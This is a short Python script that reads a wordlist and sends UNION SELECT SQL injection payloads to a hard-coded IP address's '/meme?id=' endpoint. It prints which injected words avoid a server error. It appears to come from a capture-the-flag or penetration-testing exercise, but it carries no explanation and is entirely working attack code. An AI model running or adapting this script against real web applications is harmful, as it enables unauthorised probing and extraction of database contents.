import requests

a = []

with open('words.txt', 'r') as f:
    line = f.readline()
    while(line):
        a.append(line[:-1])
        line = f.readline()

url = "http://143.0.100.198:5010/meme?id=0 UNION SELECT '"

for f in a:
    if('main' in f):
        res = requests.get(url + f + "'")
        if(res.status_code != 500):
            print('GOOD:', f)
        else:
            print('BAD: ', url + f + "'")